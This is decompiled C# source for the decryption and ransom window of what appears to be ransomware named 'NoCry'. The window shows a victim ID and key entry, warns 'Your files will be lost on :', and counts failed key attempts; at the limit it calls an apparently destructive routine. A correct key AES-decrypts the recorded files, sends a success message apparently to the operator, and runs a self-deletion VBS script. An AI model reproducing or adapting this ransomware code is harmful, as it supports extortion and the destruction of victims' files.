using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace NoCry;

[DesignerGenerated]
public class Form2 : Form
{
	private enum Enum0
	{
		const_0 = 2
	}

	private IContainer icontainer_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker backgroundWorker_0;

	private FileStream fileStream_0;

	private FileStream fileStream_1;

	private byte[] byte_0;

	private byte[] byte_1;

	private object object_0;

	private object object_1;

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_0;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker BackgroundWorker1
	{
		[CompilerGenerated]
		get
		{
			return backgroundWorker_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = method_4;
			BackgroundWorker backgroundWorker = backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			backgroundWorker_0 = value;
			backgroundWorker = backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label10")]
	internal virtual Label Label10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("TextBox2")]
	internal virtual TextBox TextBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_5;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	public Form2()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form2_FormClosing));
		((Form)this).add_Load((EventHandler)Form2_Load);
		object_0 = 0;
		object_1 = Interaction.GetSetting("T", "0", Class13.string_15, "");
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0111: Unknown result type (might be due to invalid IL or missing references)
		//IL_011b: Expected O, but got Unknown
		//IL_0232: Unknown result type (might be due to invalid IL or missing references)
		//IL_023c: Expected O, but got Unknown
		//IL_0516: Unknown result type (might be due to invalid IL or missing references)
		//IL_0520: Expected O, but got Unknown
		TextBox1 = new TextBox();
		Label6 = new Label();
		Button1 = new Button();
		Label1 = new Label();
		BackgroundWorker1 = new BackgroundWorker();
		Panel1 = new Panel();
		Label10 = new Label();
		ProgressBar1 = new ProgressBar();
		Label2 = new Label();
		PictureBox1 = new PictureBox();
		Label3 = new Label();
		TextBox2 = new TextBox();
		Button2 = new Button();
		((Control)Panel1).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)TextBox1).set_Location(new Point(58, 49));
		((Control)TextBox1).set_Name("TextBox1");
		((Control)TextBox1).set_Size(new Size(318, 20));
		((Control)TextBox1).set_TabIndex(0);
		Label6.set_AutoSize(true);
		((Control)Label6).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		((Control)Label6).set_Location(new Point(12, 50));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(40, 16));
		((Control)Label6).set_TabIndex(10);
		Label6.set_Text("key :");
		((ButtonBase)Button1).set_BackColor(Color.White);
		((Control)Button1).set_Cursor(Cursors.get_Hand());
		((Control)Button1).set_ForeColor(Color.Black);
		((Control)Button1).set_Location(new Point(3, 63));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(130, 26));
		((Control)Button1).set_TabIndex(11);
		((ButtonBase)Button1).set_Text("Decrypt");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Tahoma", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.White);
		((Control)Label1).set_Location(new Point(12, 187));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(19, 13));
		((Control)Label1).set_TabIndex(12);
		Label1.set_Text("...");
		((Control)Panel1).set_BackColor(Color.Maroon);
		Panel1.set_BorderStyle((BorderStyle)2);
		((Control)Panel1).get_Controls().Add((Control)(object)Label10);
		((Control)Panel1).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)Panel1).get_Controls().Add((Control)(object)Button1);
		((Control)Panel1).get_Controls().Add((Control)(object)Label2);
		((Control)Panel1).set_ForeColor(Color.White);
		((Control)Panel1).set_Location(new Point(236, 75));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(140, 98));
		((Control)Panel1).set_TabIndex(13);
		Label10.set_AutoSize(true);
		((Control)Label10).set_ForeColor(Color.White);
		((Control)Label10).set_Location(new Point(3, 4));
		((Control)Label10).set_Name("Label10");
		((Control)Label10).set_Size(new Size(125, 13));
		((Control)Label10).set_TabIndex(15);
		Label10.set_Text("Your files will be lost on :");
		((Control)ProgressBar1).set_Location(new Point(3, 45));
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(130, 12));
		((Control)ProgressBar1).set_TabIndex(5);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Location(new Point(3, 29));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(19, 13));
		((Control)Label2).set_TabIndex(3);
		Label2.set_Text("...");
		PictureBox1.set_Image((Image)(object)Class6.key);
		((Control)PictureBox1).set_Location(new Point(58, 92));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(139, 74));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(14);
		PictureBox1.set_TabStop(false);
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.White);
		((Control)Label3).set_Location(new Point(21, 23));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(31, 16));
		((Control)Label3).set_TabIndex(16);
		Label3.set_Text("ID :");
		((Control)TextBox2).set_Location(new Point(58, 22));
		((Control)TextBox2).set_Name("TextBox2");
		((TextBoxBase)TextBox2).set_ReadOnly(true);
		((Control)TextBox2).set_Size(new Size(266, 20));
		((Control)TextBox2).set_TabIndex(15);
		((ButtonBase)Button2).set_BackColor(Color.White);
		((Control)Button2).set_Cursor(Cursors.get_Hand());
		((Control)Button2).set_ForeColor(Color.Black);
		((Control)Button2).set_Location(new Point(330, 20));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(46, 23));
		((Control)Button2).set_TabIndex(17);
		((ButtonBase)Button2).set_Text("Copy");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Form)this).set_BackColor(Color.Maroon);
		((Form)this).set_ClientSize(new Size(388, 209));
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form2");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Decryption");
		((Control)Panel1).ResumeLayout(false);
		((Control)Panel1).PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Form2_FormClosing(object sender, FormClosingEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Invalid comparison between Unknown and I4
		if ((int)e.get_CloseReason() == 3 && ((Operators.CompareString(Label1.get_Text(), "Please Wait...", false) == 0) | (Operators.CompareString(Label1.get_Text(), "Done!", false) == 0)))
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void Form2_Load(object sender, EventArgs e)
	{
		try
		{
			ProgressBar1.set_Maximum(Conversions.ToInteger(Class13.string_16));
			if (Operators.ConditionalCompareObjectEqual(object_1, (object)null, false))
			{
				Interaction.SaveSetting("T", "0", Class13.string_15, Conversions.ToString(object_0));
				object_0 = Interaction.GetSetting("T", "0", Class13.string_15, "");
				Label2.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(object_0, (object)"/"), (object)Class13.string_16), (object)" Attempts")));
				ProgressBar1.set_Value(Conversions.ToInteger(object_0));
			}
			else
			{
				object_0 = Interaction.GetSetting("T", "0", Class13.string_15, "");
				Label2.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(object_0, (object)"/"), (object)Class13.string_16), (object)" Attempts")));
				ProgressBar1.set_Value(Conversions.ToInteger(object_0));
			}
			TextBox2.set_Text(Class13.string_1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_0(object sender, EventArgs e)
	{
		//IL_00ec: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				ref object reference;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 620:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_003a;
						case 4:
							goto IL_004c;
						case 5:
							goto IL_0062;
						case 6:
							goto IL_007b;
						case 7:
							goto IL_0094;
						case 8:
							goto IL_00a2;
						case 9:
							goto IL_00b0;
						case 10:
							goto IL_00bf;
						case 11:
							goto IL_00ce;
						case 13:
							goto IL_00e1;
						case 14:
							goto IL_00f2;
						case 15:
							goto IL_0100;
						case 16:
							goto IL_0116;
						case 17:
							goto IL_011f;
						case 18:
							goto IL_012e;
						case 19:
							goto IL_013d;
						case 20:
							goto IL_0159;
						case 22:
							goto IL_0166;
						case 23:
							goto IL_017f;
						case 24:
							goto IL_01b6;
						case 25:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 12:
						case 21:
						case 26:
						case 27:
						case 28:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0166:
					num = 22;
					reference = ref object_0;
					reference = Operators.AddObject(reference, (object)1);
					goto IL_017f;
					IL_017f:
					num = 23;
					Label2.set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(object_0, (object)"/"), (object)Class13.string_16), (object)" Attempts")));
					goto IL_01b6;
					IL_0159:
					num = 20;
					Class9.smethod_0();
					goto end_IL_0001_3;
					IL_01b6:
					num = 24;
					Interaction.SaveSetting("T", "0", Class13.string_15, Conversions.ToString(object_0));
					break;
					IL_000a:
					num = 2;
					if (check.AES_Decrypt(Interaction.GetSetting("G", "0", Class13.string_15, ""), TextBox1.get_Text()))
					{
						goto IL_003a;
					}
					goto IL_00e1;
					IL_003a:
					num = 3;
					Label1.set_Text("Please Wait...");
					goto IL_004c;
					IL_004c:
					num = 4;
					Class2.Class3_0.Form1_0.Timer1.Stop();
					goto IL_0062;
					IL_0062:
					num = 5;
					byte_0 = method_2(TextBox1.get_Text());
					goto IL_007b;
					IL_007b:
					num = 6;
					byte_1 = method_3(TextBox1.get_Text());
					goto IL_0094;
					IL_0094:
					num = 7;
					((Control)Button1).set_Enabled(false);
					goto IL_00a2;
					IL_00a2:
					num = 8;
					((Control)TextBox1).set_Enabled(false);
					goto IL_00b0;
					IL_00b0:
					num = 9;
					BackgroundWorker1.WorkerReportsProgress = true;
					goto IL_00bf;
					IL_00bf:
					num = 10;
					BackgroundWorker1.WorkerSupportsCancellation = true;
					goto IL_00ce;
					IL_00ce:
					num = 11;
					BackgroundWorker1.RunWorkerAsync();
					goto end_IL_0001_3;
					IL_00e1:
					num = 13;
					Interaction.MsgBox((object)"Incorrect Key", (MsgBoxStyle)16, (object)null);
					goto IL_00f2;
					IL_00f2:
					num = 14;
					((TextBoxBase)TextBox1).Clear();
					goto IL_0100;
					IL_0100:
					num = 15;
					if (Operators.ConditionalCompareObjectEqual(object_0, (object)Class13.string_16, false))
					{
						goto IL_0116;
					}
					goto IL_0166;
					IL_0116:
					num = 16;
					((Control)this).Hide();
					goto IL_011f;
					IL_011f:
					num = 17;
					((Control)Button1).set_Enabled(false);
					goto IL_012e;
					IL_012e:
					num = 18;
					((Control)TextBox1).set_Enabled(false);
					goto IL_013d;
					IL_013d:
					num = 19;
					Interaction.SaveSetting("D", "0", Class13.string_15, "OK");
					goto IL_0159;
					end_IL_0001_2:
					break;
				}
				num = 25;
				ProgressBar1.Increment(1);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 620;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_1(string string_0, string string_1, byte[] byte_2, byte[] byte_3, Enum0 enum0_0)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		byte[] buffer = default(byte[]);
		CryptoStream cryptoStream = default(CryptoStream);
		FileInfo fileInfo = default(FileInfo);
		long num6 = default(long);
		long length = default(long);
		RijndaelManaged rijndaelManaged = default(RijndaelManaged);
		FileInfo fileInfo2 = default(FileInfo);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 441:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_002a;
						case 5:
							goto IL_0039;
						case 6:
							goto IL_0046;
						case 7:
							goto IL_004b;
						case 8:
							goto IL_005a;
						case 9:
							goto IL_0063;
						case 11:
							goto IL_0071;
						case 15:
							goto IL_008e;
						case 16:
							goto IL_00a5;
						case 17:
							goto IL_00b3;
						case 10:
						case 12:
						case 13:
						case 14:
						case 18:
							goto IL_00bc;
						case 19:
							goto IL_00c6;
						case 20:
							goto IL_00d0;
						case 21:
							goto IL_00de;
						case 22:
							goto IL_00ec;
						case 23:
							goto IL_00f6;
						case 24:
							goto IL_0101;
						case 25:
						case 26:
							goto IL_010b;
						case 27:
							goto IL_0115;
						case 28:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 29:
						case 30:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_008e:
					num = 15;
					num5 = fileStream_0.Read(buffer, 0, 4096);
					goto IL_00a5;
					IL_00a5:
					num = 16;
					cryptoStream.Write(buffer, 0, num5);
					goto IL_00b3;
					IL_0115:
					num = 27;
					fileInfo = new FileInfo(string_0);
					break;
					IL_00b3:
					num = 17;
					num6 = checked(num6 + num5);
					goto IL_00bc;
					IL_000a:
					num = 2;
					fileStream_0 = new FileStream(string_0, FileMode.Open, FileAccess.Read);
					goto IL_001a;
					IL_001a:
					num = 3;
					fileStream_1 = new FileStream(string_1, FileMode.OpenOrCreate, FileAccess.Write);
					goto IL_002a;
					IL_002a:
					num = 4;
					fileStream_1.SetLength(0L);
					goto IL_0039;
					IL_0039:
					num = 5;
					buffer = new byte[4097];
					goto IL_0046;
					IL_0046:
					num = 6;
					num6 = 0L;
					goto IL_004b;
					IL_004b:
					num = 7;
					length = fileStream_0.Length;
					goto IL_005a;
					IL_005a:
					num = 8;
					rijndaelManaged = new RijndaelManaged();
					goto IL_0063;
					IL_0063:
					num = 9;
					if (enum0_0 == Enum0.const_0)
					{
						goto IL_0071;
					}
					goto IL_00bc;
					IL_0071:
					num = 11;
					cryptoStream = new CryptoStream(fileStream_1, rijndaelManaged.CreateDecryptor(byte_2, byte_3), CryptoStreamMode.Write);
					goto IL_00bc;
					IL_00bc:
					num = 14;
					if (num6 < length)
					{
						goto IL_008e;
					}
					goto IL_00c6;
					IL_00c6:
					num = 19;
					cryptoStream.Close();
					goto IL_00d0;
					IL_00d0:
					num = 20;
					fileStream_0.Close();
					goto IL_00de;
					IL_00de:
					num = 21;
					fileStream_1.Close();
					goto IL_00ec;
					IL_00ec:
					num = 22;
					if (enum0_0 == Enum0.const_0)
					{
						goto IL_00f6;
					}
					goto IL_010b;
					IL_00f6:
					num = 23;
					fileInfo2 = new FileInfo(string_0);
					goto IL_0101;
					IL_0101:
					num = 24;
					fileInfo2.Delete();
					goto IL_010b;
					IL_010b:
					num = 26;
					if (enum0_0 != Enum0.const_0)
					{
						goto end_IL_0001_3;
					}
					goto IL_0115;
					end_IL_0001_2:
					break;
				}
				num = 28;
				fileInfo.Delete();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 441;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private byte[] method_2(string string_0)
	{
		char[] array = string_0.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	private byte[] method_3(string string_0)
	{
		char[] array = string_0.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void method_4(object sender, DoWorkEventArgs e)
	{
		//IL_024e: Unknown result type (might be due to invalid IL or missing references)
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		StreamWriter streamWriter = default(StreamWriter);
		string text2 = default(string);
		Class10 @class = default(Class10);
		int num5 = default(int);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		string current = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_000a;
				case 925:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_000a;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_0032;
						case 6:
							goto IL_0040;
						case 7:
							goto IL_004d;
						case 8:
							goto IL_0065;
						case 9:
							goto IL_0085;
						case 10:
							goto IL_0091;
						case 11:
							goto IL_00ba;
						case 12:
							goto IL_00c1;
						case 13:
						case 14:
							goto IL_00da;
						case 15:
							goto IL_00df;
						case 16:
							goto IL_00ef;
						case 17:
							goto IL_00fc;
						case 18:
							goto IL_0118;
						case 19:
							goto IL_0134;
						case 20:
							goto IL_0150;
						case 21:
							goto IL_016c;
						case 22:
							goto IL_0188;
						case 23:
							goto IL_01a4;
						case 24:
							goto IL_01c0;
						case 25:
							goto IL_01dc;
						case 26:
							goto IL_01f8;
						case 27:
							goto IL_0214;
						case 28:
							goto IL_0227;
						case 29:
							goto IL_0236;
						case 30:
						case 31:
							goto IL_0243;
						case 32:
							goto IL_0254;
						case 33:
							goto IL_025e;
						case 34:
							goto IL_0272;
						case 35:
							goto IL_0288;
						case 36:
							goto IL_02b3;
						case 37:
							goto IL_02c0;
						case 38:
							goto IL_02cc;
						case 39:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 40:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0288:
					num = 35;
					text = text.Replace("%startup%", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Class13.string_4 + ".exe");
					goto IL_02b3;
					IL_02b3:
					num = 36;
					streamWriter = new StreamWriter(text2, append: false);
					goto IL_02c0;
					IL_0272:
					num = 34;
					text = text.Replace("%path%", Application.get_ExecutablePath());
					goto IL_0288;
					IL_02c0:
					num = 37;
					streamWriter.WriteLine(text);
					goto IL_02cc;
					IL_000a:
					num = 2;
					((Control)Button1).set_Enabled(false);
					goto IL_0018;
					IL_0018:
					num = 3;
					@class = new Class10(Class10.string_0);
					goto IL_0025;
					IL_0025:
					num = 4;
					@class._name = Class10.string_1;
					goto IL_0032;
					IL_0032:
					num = 5;
					@class.method_1("**Decrypted Successfully!**");
					goto IL_0040;
					IL_0040:
					num = 6;
					num5 = Form4.listenc.Count;
					goto IL_004d;
					IL_004d:
					num = 7;
					((Form)this).set_Text("Decryption : Working * " + Conversions.ToString(num5));
					goto IL_0065;
					IL_0065:
					num = 8;
					enumerator = Form4.listenc.GetEnumerator();
					goto IL_0073;
					IL_0073:
					if (enumerator.MoveNext())
					{
						current = enumerator.Current;
						goto IL_0085;
					}
					goto IL_00df;
					IL_02cc:
					num = 38;
					streamWriter.Close();
					break;
					IL_0085:
					num = 9;
					if (File.Exists(current))
					{
						goto IL_0091;
					}
					goto IL_00da;
					IL_0091:
					num = 10;
					method_1(current, current.Replace(Class13.string_5, ""), byte_0, byte_1, Enum0.const_0);
					goto IL_00ba;
					IL_00ba:
					num = 11;
					num5 = checked(num5 - 1);
					goto IL_00c1;
					IL_00c1:
					num = 12;
					((Form)this).set_Text("Decryption : Working * " + Conversions.ToString(num5));
					goto IL_00da;
					IL_00da:
					num = 14;
					goto IL_0073;
					IL_00df:
					num = 15;
					((IDisposable)enumerator).Dispose();
					goto IL_00ef;
					IL_00ef:
					num = 16;
					Form4.listenc.Clear();
					goto IL_00fc;
					IL_00fc:
					num = 17;
					Interaction.SaveSetting("P", "0", Class13.string_15, "");
					goto IL_0118;
					IL_0118:
					num = 18;
					Interaction.SaveSetting("H", "0", Class13.string_15, "");
					goto IL_0134;
					IL_0134:
					num = 19;
					Interaction.SaveSetting("M", "0", Class13.string_15, "");
					goto IL_0150;
					IL_0150:
					num = 20;
					Interaction.SaveSetting("S", "0", Class13.string_15, "");
					goto IL_016c;
					IL_016c:
					num = 21;
					Interaction.SaveSetting("X", "0", Class13.string_15, "");
					goto IL_0188;
					IL_0188:
					num = 22;
					Interaction.SaveSetting("D", "0", Class13.string_15, "");
					goto IL_01a4;
					IL_01a4:
					num = 23;
					Interaction.SaveSetting("T", "0", Class13.string_15, "");
					goto IL_01c0;
					IL_01c0:
					num = 24;
					Interaction.SaveSetting("G", "0", Class13.string_15, "");
					goto IL_01dc;
					IL_01dc:
					num = 25;
					Interaction.SaveSetting("F", "0", Class13.string_15, "");
					goto IL_01f8;
					IL_01f8:
					num = 26;
					Interaction.SaveSetting("C", "0", Class13.string_15, "");
					goto IL_0214;
					IL_0214:
					num = 27;
					Label1.set_Text("Done!");
					goto IL_0227;
					IL_0227:
					num = 28;
					if (File.Exists(Class13.string_6))
					{
						goto IL_0236;
					}
					goto IL_0243;
					IL_0236:
					num = 29;
					File.Delete(Class13.string_6);
					goto IL_0243;
					IL_0243:
					num = 31;
					Interaction.MsgBox((object)"Decryption completed successfully!", (MsgBoxStyle)64, (object)null);
					goto IL_0254;
					IL_0254:
					num = 32;
					text = Class6.del;
					goto IL_025e;
					IL_025e:
					num = 33;
					text2 = Path.GetTempPath() + "del.vbs";
					goto IL_0272;
					end_IL_0001_2:
					break;
				}
				num = 39;
				Process.Start(text2);
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 925;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void method_5(object sender, EventArgs e)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Clipboard.SetText(TextBox2.get_Text());
			MessageBox.Show("Copied To Clipboard");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}
}
